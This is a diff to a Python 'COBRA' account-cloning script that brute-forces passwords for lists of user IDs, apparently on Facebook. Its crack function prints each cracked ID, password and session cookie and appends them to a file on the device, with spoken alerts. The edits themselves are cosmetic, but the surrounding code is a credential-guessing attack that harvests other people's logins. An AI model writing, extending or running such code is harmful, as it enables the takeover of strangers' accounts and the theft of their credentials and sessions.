@@ -94,11 +94,11 @@ def uaku():
 			ugen.append(ub)
 	except:
 		a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
-		ua=open('.bbnew.txt','w')
+		ua=open('bbnew.txt','w')
 		aa=re.findall('line">(.*?)<',str(a))
 		for un in aa:
 			ua.write(un+'\n')
-		ua=open('.bbnew.txt','r').read().splitlines()
+		ua=open('bbnew.txt','r').read().splitlines()
 id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
 cokbrut=[]
 
@@ -410,9 +410,9 @@ def setting():
 		for bacot in id:
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
-	print('\x1b[1;92m LOGIN \n\x1b[1;97m [1] METHOD(1) \n\x1b[1;94m [2] METHOD(2) ')
+	print('\x1b[1;92m LOGIN \n\x1b[1;97m [1] METHOD(1) \n\x1b[1;97m [2] METHOD(2) ')
 	os.system('espeak -a 300 " choose a option as your wish"')
-	hc = input(' CHOOSE: ')
+	hc = input(' \033[1;96mCHOOSE: ')
 	if hc in ['1','01']:
 		method.append('mobile')
 	elif hc in ['2','02']:
@@ -476,7 +476,7 @@ def passwrd():
 	print('')
 	COBRAj('==========================================')
 	COBRAj('CLONING COMPLETE .......... ')
-	print(f'{h}[{h}🥰{h}]{h} Your Total OK idz : {h}%s '%(ok))
+	print(f'{h}[{h}🥰{h}]{h} Your Total OK ids : {h}%s '%(ok))
 	input('CLICK ENTER TO EXIT ')
 		
 def crack(idf,pwv):
@@ -514,14 +514,14 @@ def crack(idf,pwv):
 				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•COBRA-Ok😘] {idf} • {pw}\n\033[0;93m[🇧🇩]= COOKIES • \033[0;92m{kuki} ')
 				print('\033[0;94m==============================================================')
 				os.system('espeak -a 300 " FIROZ,  Ok,  ID"')
-				open('/sdcard/COBRA-OK.txt', 'a').write( idf+' | '+pw+'\n'+'kuki'+'\n')
+				open('/sdcard/COBRA-OK.txt', 'a').write( idf+' | '+pw+'\n'+'coki'+'\n')
 				cek_apk(session,coki)
 				break
 				
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
-			time.sleep(31)
+			time.sleep(10)
 	loop+=1
 if __name__=='__main__':
 	try:os.system('git pull')
